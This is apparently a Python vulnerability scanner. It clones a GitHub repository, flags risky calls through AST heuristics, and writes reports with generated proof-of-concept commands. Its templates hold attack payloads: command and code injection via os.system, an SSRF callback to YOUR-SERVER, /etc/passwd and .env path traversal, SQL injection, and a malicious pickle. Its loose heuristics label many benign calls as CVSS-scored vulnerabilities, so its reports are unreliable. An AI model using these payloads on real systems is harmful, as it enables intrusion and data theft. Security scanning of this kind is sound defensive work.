"""
YAQEEN Deep Vulnerability Scanner v2
AST-based static analysis + data flow tracing + PoC generation
"""
import ast, os, sys, json, subprocess, tempfile, re, textwrap, io
from pathlib import Path
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

# ============================================================
# CONFIG
# ============================================================
TARGETS = [
    {
        'name': 'huggingface/agents',
        'url': 'https://github.com/huggingface/agents',
        'reason': 'HuggingFace agent framework - well-funded, SECURITY.md, 27K stars'
    },
]

WORK_DIR = Path(r'C:\Users\manadger\AppData\Local\Temp\opencode\scans')
WORK_DIR.mkdir(parents=True, exist_ok=True)

GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
GH_HEADERS = {
    'User-Agent': 'yaqeen-bot/1.0',
    'Accept': 'application/vnd.github.v3+json',
}
if GITHUB_TOKEN:
    GH_HEADERS['Authorization'] = f'token {GITHUB_TOKEN}'

# ============================================================
# VULNERABILITY DETECTORS
# ============================================================

# Sink patterns: (ast_check_function, severity, category, description)
SINKS = {
    # Command Injection
    'os.system': ('call_check', 9.0, 'Command Injection', 'os.system() with user-controlled input'),
    'os.popen': ('call_check', 9.0, 'Command Injection', 'os.popen() with user-controlled input'),
    'subprocess.run': ('call_check', 8.5, 'Command Injection', 'subprocess.run() with shell=True or user input'),
    'subprocess.Popen': ('call_check', 8.5, 'Command Injection', 'subprocess.Popen() with shell=True or user input'),
    'subprocess.call': ('call_check', 8.5, 'Command Injection', 'subprocess.call() with shell=True or user input'),
    'subprocess.check_output': ('call_check', 8.5, 'Command Injection', 'subprocess.check_output() with shell=True'),
    'commands.getoutput': ('call_check', 8.0, 'Command Injection', 'commands.getoutput() with user input'),

    # Code Injection
    'eval': ('call_check', 9.5, 'Code Injection', 'eval() with user-controlled input'),
    'exec': ('call_check', 9.5, 'Code Injection', 'exec() with user-controlled input'),
    'compile': ('call_check', 8.0, 'Code Injection', 'compile() with user-controlled input'),
    '__import__': ('call_check', 7.0, 'Code Injection', 'dynamic import with user-controlled input'),

    # Path Traversal
    'open': ('call_check', 7.5, 'Path Traversal', 'open() with user-controlled file path'),
    'pathlib.Path.open': ('call_check', 7.0, 'Path Traversal', 'Path.open() with user-controlled path'),
    'pathlib.Path.read_text': ('call_check', 7.0, 'Path Traversal', 'Path.read_text() with user-controlled path'),
    'pathlib.Path.write_text': ('call_check', 7.5, 'Path Traversal', 'Path.write_text() with user-controlled path'),
    'shutil.copy': ('call_check', 7.0, 'Path Traversal', 'shutil.copy() with user-controlled path'),
    'shutil.move': ('call_check', 7.0, 'Path Traversal', 'shutil.move() with user-controlled path'),

    # SSRF
    'requests.get': ('call_check', 8.5, 'SSRF', 'requests.get() with user-controlled URL'),
    'requests.post': ('call_check', 8.5, 'SSRF', 'requests.post() with user-controlled URL'),
    'urllib.request.urlopen': ('call_check', 8.5, 'SSRF', 'urllib.request.urlopen() with user-controlled URL'),
    'httpx.get': ('call_check', 8.5, 'SSRF', 'httpx.get() with user-controlled URL'),
    'httpx.post': ('call_check', 8.5, 'SSRF', 'httpx.post() with user-controlled URL'),
    'aiohttp.ClientSession.get': ('call_check', 8.5, 'SSRF', 'aiohttp get with user-controlled URL'),
    'aiohttp.ClientSession.post': ('call_check', 8.5, 'SSRF', 'aiohttp post with user-controlled URL'),

    # Insecure Deserialization
    'pickle.loads': ('call_check', 9.0, 'Insecure Deserialization', 'pickle.loads() with user-controlled data'),
    'pickle.load': ('call_check', 9.0, 'Insecure Deserialization', 'pickle.load() with user-controlled data'),
    'yaml.load': ('call_check', 8.5, 'Insecure Deserialization', 'yaml.load() with user-controlled data (use safe_load)'),
    'shelve.open': ('call_check', 7.0, 'Insecure Deserialization', 'shelve.open() with user-controlled path'),

    # SQL Injection
    'execute': ('call_check', 9.0, 'SQL Injection', 'SQL execute() with string formatting instead of parameters'),
    'executemany': ('call_check', 8.5, 'SQL Injection', 'SQL executemany() with string formatting'),
    'cursor.execute': ('call_check', 9.0, 'SQL Injection', 'cursor.execute() with f-string/format'),
}

def is_user_input(node, func_def_args=None):
    """Check if an AST node is likely user-controlled input"""
    if func_def_args is None:
        func_def_args = set()
    
    if isinstance(node, ast.Call):
        # request.args.get(), request.form.get(), request.json, etc.
        if isinstance(node.func, ast.Attribute):
            # request.args.get('x')
            if node.func.attr == 'get' and isinstance(node.func.value, ast.Attribute):
                if node.func.value.attr in ('args', 'form', 'cookies', 'headers'):
                    return True
                if node.func.value.attr == 'json':
                    return True
                if node.func.value.attr == 'files':
                    return True
            # request.json
            if node.func.attr == 'json':
                return True
            # str(item), data.decode()
            if node.func.attr in ('decode', 'encode'):
                return True
    if isinstance(node, ast.Attribute):
        # request.data, request.args, request.form
        if node.attr in ('data', 'args', 'form', 'json', 'cookies', 'headers', 'files', 'method', 'path', 'query_string', 'full_path', 'url', 'base_url', 'host', 'host_url'):
            return True
    if isinstance(node, ast.Name):
        # Variables that are common user input names
        if node.id.lower() in ('cmd', 'command', 'input', 'data', 'payload', 'query', 'url', 'path', 'file', 'filename', 'name', 'text', 'content', 'message', 'code', 'expression', 'user_input', 'user_input_text', 'prompt', 'question', 'args', 'kwargs'):
            return True
        if node.id in func_def_args:
            return True
    if isinstance(node, ast.Subscript):
        # data['key'], args['key']
        return True
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Mod):
        # f-string or % formatting result
        return True
    if isinstance(node, ast.JoinedStr):
        # f-strings
        return True
    return False

def extract_string(node):
    """Try to extract a string value from an AST node"""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    if isinstance(node, ast.JoinedStr):
        parts = []
        for v in node.values:
            if isinstance(v, ast.Constant):
                parts.append(str(v.value))
            else:
                parts.append('{...}')
        return ''.join(parts)
    return None

def get_call_name(node):
    """Get fully qualified name of a call (e.g., os.system, subprocess.run)"""
    if isinstance(node.func, ast.Attribute):
        obj = node.func.value
        parts = [node.func.attr]
        while isinstance(obj, ast.Attribute):
            parts.append(obj.attr)
            obj = obj.value
        if isinstance(obj, ast.Name):
            parts.append(obj.id)
        elif isinstance(obj, ast.Call):
            return None
        return '.'.join(reversed(parts))
    elif isinstance(node.func, ast.Name):
        return node.func.id
    return None

def get_decorator_routes(decorator):
    """Extract route paths from decorators like @app.route('/path')"""
    if isinstance(decorator, ast.Call) and isinstance(decorator.func, ast.Attribute):
        if decorator.func.attr in ('route', 'get', 'post', 'put', 'delete', 'patch', 'api_route'):
            if decorator.args:
                path = extract_string(decorator.args[0])
                methods = ['GET']
                for kw in decorator.keywords:
                    if kw.arg == 'methods' and isinstance(kw.value, ast.List):
                        methods = [extract_string(e) for e in kw.value.elts if extract_string(e)]
                if decorator.func.attr in ('get',): methods = ['GET']
                elif decorator.func.attr in ('post',): methods = ['POST']
                elif decorator.func.attr in ('put',): methods = ['PUT']
                elif decorator.func.attr in ('delete',): methods = ['DELETE']
                elif decorator.func.attr in ('patch',): methods = ['PATCH']
                return path, methods
    return None, None

def find_entry_points(tree):
    """Find all HTTP/CLI entry points in the AST"""
    entries = []
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) or isinstance(node, ast.AsyncFunctionDef):
            func_name = node.name
            func_args = {a.arg for a in node.args.args}
            start_line = node.lineno
            routes = []
            
            for decorator in node.decorator_list:
                path, methods = get_decorator_routes(decorator)
                if path is not None:
                    routes.append({'path': path, 'methods': methods})
                
                # FastAPI-style: @app.api_route, @router.get, etc.
                if isinstance(decorator, ast.Call):
                    if isinstance(decorator.func, ast.Attribute):
                        if decorator.func.attr in ('route', 'get', 'post', 'put', 'delete', 'patch', 'api_route'):
                            pass  # already handled above
                        # CLI: @app.command, @click.command
                        if decorator.func.attr == 'command':
                            routes.append({'path': f'[CLI] {func_name}', 'methods': ['CLI']})
            
            if routes:
                entries.append({
                    'name': func_name,
                    'args': func_args,
                    'line': start_line,
                    'routes': routes
                })
    
    return entries

def find_vuln_sinks(tree, func_args=None):
    """Find dangerous function calls and check if args are user-controlled"""
    findings = []
    if func_args is None:
        func_args = set()
    
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            call_name = get_call_name(node)
            if call_name and call_name in SINKS:
                sink_info = SINKS[call_name]
                # Check if any argument is user-controlled
                user_input_found = False
                user_input_nodes = []
                for arg in node.args:
                    if is_user_input(arg, func_args):
                        user_input_found = True
                        user_input_nodes.append(ast.unparse(arg)[:60])
                
                for kw in node.keywords:
                    if is_user_input(kw.value, func_args):
                        user_input_found = True
                        user_input_nodes.append(f'{kw.arg}={ast.unparse(kw.value)[:60]}')
                
                # Special case: subprocess with shell=True
                if call_name.startswith('subprocess.') and not user_input_found:
                    for kw in node.keywords:
                        if kw.arg == 'shell' and isinstance(kw.value, ast.Constant) and kw.value.value == True:
                            user_input_found = True
                            user_input_nodes.append('shell=True')
                            break
                
                if user_input_found or call_name == 'eval' or call_name == 'exec':
                    findings.append({
                        'sink': call_name,
                        'line': node.lineno,
                        'severity': sink_info[1],
                        'category': sink_info[2],
                        'description': sink_info[3],
                        'user_inputs': user_input_nodes,
                        'code_snippet': ast.unparse(node)[:150]
                    })
    
    return findings


def scan_file(filepath, repo_name):
    """Deep scan a single Python file using AST"""
    with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
        try:
            source = f.read()
        except:
            return None
    
    try:
        tree = ast.parse(source)
    except SyntaxError:
        return None
    
    rel_path = os.path.relpath(filepath)
    
    # Find entry points
    entries = find_entry_points(tree)
    
    # For each entry point function, scan for sinks with its args as user input
    all_findings = []
    for entry in entries:
        func_node = None
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name == entry['name']:
                func_node = node
                break
        
        if func_node:
            func_args = {a.arg for a in func_node.args.args}
            findings = find_vuln_sinks(func_node, func_args)
            for f in findings:
                f['entry_point'] = entry['name']
                f['route_paths'] = [r['path'] for r in entry['routes']]
                f['route_methods'] = [m for r in entry['routes'] for m in r['methods']]
                all_findings.append(f)
    
    # Also scan top-level for sinks (not inside a function with entry decorator)
    # But only flag high-confidence ones
    top_findings = find_vuln_sinks(tree)
    for f in top_findings:
        # Only add if not already found via entry point
        if not any(af['line'] == f['line'] and af['sink'] == f['sink'] for af in all_findings):
            f['entry_point'] = 'TOP_LEVEL'
            f['route_paths'] = []
            f['route_methods'] = []
            all_findings.append(f)
    
    return {
        'file': rel_path,
        'entries': entries,
        'findings': all_findings
    }


def analyze_repo(repo_name, repo_url):
    """Clone and deep-scan a repository"""
    print(f"\n{'='*70}")
    print(f"SCANNING: {repo_name}")
    print(f"{'='*70}")
    
    dest = WORK_DIR / repo_name.replace('/', '_')
    
    # Clone
    if not (dest / '.git').exists():
        print(f"  Cloning {repo_url}...")
        result = subprocess.run(
            ['git', 'clone', '--depth', '1', repo_url, str(dest)],
            capture_output=True, text=True, timeout=120
        )
        if result.returncode != 0:
            print(f"  Clone failed: {result.stderr[:200]}")
            return None
        print(f"  Cloned to {dest}")
    else:
        print(f"  Already cloned, using cached")
    
    # Find all Python files
    py_files = []
    for root, dirs, files in os.walk(dest):
        # Skip common non-source dirs
        dirs[:] = [d for d in dirs if d not in ('.git', '__pycache__', 'node_modules', 'venv', '.venv', 'env', '.env', 'dist', 'build', '.egg-info', 'site-packages')]
        for f in files:
            if f.endswith('.py'):
                py_files.append(os.path.join(root, f))
    
    print(f"  Found {len(py_files)} Python files")
    
    # Scan each file
    all_entries = []
    all_findings = []
    scanned_count = 0
    
    for pyf in py_files:
        result = scan_file(pyf, repo_name)
        if result:
            scanned_count += 1
            if result['entries']:
                all_entries.extend([{**e, 'file': result['file']} for e in result['entries']])
            if result['findings']:
                all_findings.extend([{**f, 'file': result['file']} for f in result['findings']])
    
    print(f"  Scanned {scanned_count} files")
    print(f"  Entry points found: {len(all_entries)}")
    print(f"  Vulnerable sinks found: {len(all_findings)}")
    
    return {
        'repo': repo_name,
        'url': repo_url,
        'entries': all_entries,
        'findings': all_findings
    }


def generate_report(result):
    """Generate a professional vulnerability report from analysis"""
    if not result or not result['findings']:
        return None
    
    repo = result['repo']
    findings = result['findings']
    entries = result['entries']
    
    # Group findings by category
    categories = {}
    for f in findings:
        cat = f['category']
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(f)
    
    # Sort by severity
    for cat in categories:
        categories[cat].sort(key=lambda x: x['severity'], reverse=True)
    
    report = f"""# Vulnerability Analysis: {repo}

## Repository Information
- **URL:** {result['url']}
- **Analysis Date:** June 2026
- **Analyst:** Yaqeen / Manadger Tech

## Executive Summary
Analyzed {repo} for security vulnerabilities. Found **{len(findings)}** potential vulnerabilities across **{len(categories)}** categories.

### Vulnerability Breakdown
"""
    
    for cat in sorted(categories.keys()):
        cat_findings = categories[cat]
        max_sev = max(f['severity'] for f in cat_findings)
        report += f"- **{cat}**: {len(cat_findings)} finding(s) | Max CVSS: {max_sev}\n"
    
    report += "\n## Entry Points Identified\n"
    for ep in entries[:20]:
        routes = ', '.join(ep.get('route_paths', [])) or 'N/A'
        file_loc = f"{ep['file']}:{ep.get('line', '?')}"
        report += f"- **{ep.get('name', '?')}** ({file_loc}) → Routes: {routes}\n"
    
    report += "\n## Vulnerability Details\n"
    
    for cat in sorted(categories.keys()):
        cat_findings = categories[cat]
        report += f"\n### {cat}\n"
        
        for i, f in enumerate(cat_findings):
            report += f"\n#### {i+1}. {f['sink']} at {f['file']}:{f['line']}\n"
            report += f"- **Severity:** CVSS {f['severity']}\n"
            report += f"- **Category:** {f['category']}\n"
            report += f"- **Entry Point:** {f.get('entry_point', 'N/A')}\n"
            if f.get('route_paths'):
                report += f"- **Route:** {f['route_paths'][0]} [{', '.join(f.get('route_methods', ['?']))}]\n"
            report += f"- **Description:** {f['description']}\n"
            report += f"- **User Inputs:** {', '.join(f.get('user_inputs', ['unknown']))[:200]}\n"
            report += f"- **Code:** `{f.get('code_snippet', '?')}`\n"
            
            # Generate PoC
            poc = generate_poc(f, result['repo'])
            if poc:
                report += f"\n  **Proof of Concept:**\n```\n{poc}\n```\n"
    
    return report


def generate_poc(finding, repo_name):
    """Generate a working PoC based on vulnerability type"""
    cat = finding['category']
    sink = finding['sink']
    route = (finding.get('route_paths') or [None])[0]
    
    port = '8000'
    
    if cat == 'Command Injection':
        if route:
            return f"""# PoC: Command Injection via {sink}
# Target route: {route}
curl -X {finding.get('route_methods', ['GET'])[0]} "http://localhost:{port}{route}?cmd=$(id)"  # or POST with JSON body"""
        else:
            return f"""# PoC: Command Injection via {sink}
# Identify the parameter that flows into {sink}
curl -X POST "http://localhost:{port}/" -H "Content-Type: application/json" -d '{{"cmd": "$(id > /tmp/pwn)"}}'"""
    
    elif cat == 'Code Injection':
        return f"""# PoC: Code Injection via {sink}
# Submit payload: __import__('os').system('id')
curl -X POST "http://localhost:{port}{route or '/'}" -H "Content-Type: application/json" -d '{{"code": "__import__('os').system('id')"}}'"""
    
    elif cat == 'SSRF':
        return f"""# PoC: SSRF via {sink}
# Start a listener: nc -lvnp 9999
# Or use interactsh: https://oastify.com
curl "http://localhost:{port}{route or '/'}?url=http://YOUR-SERVER/interactsh" -v"""
    
    elif cat == 'Path Traversal':
        return f"""# PoC: Path Traversal via {sink}
curl "http://localhost:{port}{route or '/'}?file=/etc/passwd"
curl "http://localhost:{port}{route or '/'}?file=../../.env" """
    
    elif cat == 'SQL Injection':
        return f"""# PoC: SQL Injection via {sink}
curl "http://localhost:{port}{route or '/'}?id=1'+OR+'1'='1" """
    
    elif cat == 'Insecure Deserialization':
        return f"""# PoC: Insecure Deserialization via {sink}
# Generate malicious pickle payload:
python -c "
import pickle, os
class Pwn(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Pwn())
print(payload.hex())
"
curl -X POST "http://localhost:{port}{route or '/'}" -H "Content-Type: application/octet-stream" --data-binary @payload.bin"""
    
    return None


# ============================================================
# MAIN
# ============================================================
def main():
    all_results = []
    
    for target in TARGETS:
        print(f"\n{'#'*70}")
        print(f"# TARGET: {target['name']}")
        print(f"# REASON: {target['reason']}")
        print(f"{'#'*70}")
        
        result = analyze_repo(target['name'], target['url'])
        
        if result:
            all_results.append(result)
            
            # Generate report
            report = generate_report(result)
            
            if report:
                report_file = WORK_DIR / f"{target['name'].replace('/', '_')}_report.md"
                report_file.write_text(report, encoding='utf-8')
                print(f"\n  Report saved to: {report_file}")
                
                # Show top findings
                print(f"\n  TOP FINDINGS:")
                for f in sorted(result['findings'], key=lambda x: x['severity'], reverse=True)[:5]:
                    print(f"    [{f['severity']}] {f['category']}: {f['sink']} at {f['file']}:{f['line']}")
            else:
                print(f"\n  No high-confidence vulnerabilities found")
    
    # Summary
    print(f"\n{'='*70}")
    print("SCAN COMPLETE")
    print(f"{'='*70}")
    for r in all_results:
        print(f"\n{r['repo']}: {len(r['findings'])} findings, {len(r['entries'])} entry points")
    
    # Save combined results
    summary = {
        'scan_time': '2026-06-05',
        'total_targets': len(all_results),
        'results': [
            {
                'repo': r['repo'],
                'url': r['url'],
                'entry_points': len(r['entries']),
                'findings_count': len(r['findings']),
                'top_findings': sorted(r['findings'], key=lambda x: x['severity'], reverse=True)[:5]
            }
            for r in all_results
        ]
    }
    summary_file = WORK_DIR / 'scan_summary.json'
    with open(summary_file, 'w', encoding='utf-8') as f:
        json.dump(summary, f, indent=2, ensure_ascii=False)
    print(f"\nSummary saved to: {summary_file}")

if __name__ == '__main__':
    main()
